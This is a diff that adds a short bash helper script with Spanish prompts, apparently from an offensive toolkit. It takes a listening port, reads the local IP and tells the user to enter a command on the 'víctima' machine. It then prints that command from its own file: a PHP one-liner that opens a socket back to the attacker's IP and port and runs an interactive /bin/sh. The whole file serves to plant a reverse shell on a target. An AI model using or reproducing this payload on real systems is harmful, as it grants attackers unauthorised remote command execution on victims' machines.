@@ -1,0 +1,18 @@
+#!/bin/bash
+
+if [[ -z $1 ]] ; then
+	echo " "
+	echo "[*]phpshell (+) <puerto de escucha>."
+	echo " "
+	exit
+fi
+
+ipx=`hostname -I`
+
+echo " "
+echo "[*]Ingrese lo siguiente en la máquina víctima: "
+echo " "
+
+#php -r '$sock=fsockopen("<IP MÁQUINA>",<PUERTO DE ESCUCHA>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+cat phpshell | tail -3 | head -1
